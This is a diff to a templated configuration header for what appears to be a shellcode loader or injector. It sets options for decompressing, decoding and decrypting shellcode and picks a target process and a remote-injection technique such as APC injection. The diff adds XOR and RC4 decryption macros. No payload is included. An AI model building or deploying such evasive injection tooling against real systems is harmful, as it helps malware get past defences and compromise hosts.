@@ -5,12 +5,12 @@
 // ============================================
 // COMPRESSION CONFIGURATION
 // ============================================
-
 // Compression method used for shellcode:
 // 0 = NONE        - No decompression
 // 1 = LZNT1       - LZNT1 compression
 // 2 = RLE         - Run-Length Encoding
 #define CONFIG_COMPRESSION_TYPE {{ COMPRESSION_TYPE }}
+
 #if CONFIG_COMPRESSION_TYPE == 1
 #define DecompressShellcode erebus::DecompressionLZNT
 #elif CONFIG_COMPRESSION_TYPE == 2
@@ -20,7 +20,6 @@
 // ============================================
 // ENCODING CONFIGURATION
 // ============================================
-
 // Encoding method used for shellcode:
 // 0 = NONE        - No decoding
 // 1 = BASE64      - Base64 encoding
@@ -28,6 +27,7 @@
 // 3 = ALPHA32     - ALPHA32 encoding
 // 4 = WORDS256    - WORDS256 encoding
 #define CONFIG_ENCODING_TYPE {{ ENCODING_TYPE }}
+
 #if CONFIG_ENCODING_TYPE == 1
 #define DecodeShellcode erebus::DecodeBase64
 #elif CONFIG_ENCODING_TYPE == 2
@@ -41,7 +41,6 @@
 // ============================================
 // ENCRYPTION CONFIGURATION
 // ============================================
-
 // Encryption method used for shellcode:
 // 0 = NONE        - No decryption
 // 1 = XOR         - Simple XOR cipher
@@ -49,13 +48,18 @@
 // 3 = AES_ECB     - AES in ECB mode
 // 4 = AES_CBC     - AES in CBC mode
 #define CONFIG_ENCRYPTION_TYPE {{ ENCRYPTION_TYPE }}
+#if CONFIG_ENCRYPTION_TYPE == 1
+#define DecryptShellcode erebus::DecryptionXor
+#elif CONFIG_ENCRYPTION_TYPE == 2
+#define DecryptShellcode erebus::DecryptionRc4
+#endif
 
 // ============================================
 // INJECTION CONFIGURATION
 // ============================================
 
 // Target process for remote injection
-#define CONFIG_TARGET_PROCESS L"{{ TARGET_PROCESS }}\0"
+#define CONFIG_TARGET_PROCESS L"{{ TARGET_PROCESS }}\\0"
 
 // Injection technique:
 // 1 = NtQueueApcThread    - APC injection to suspended thread (Remote)
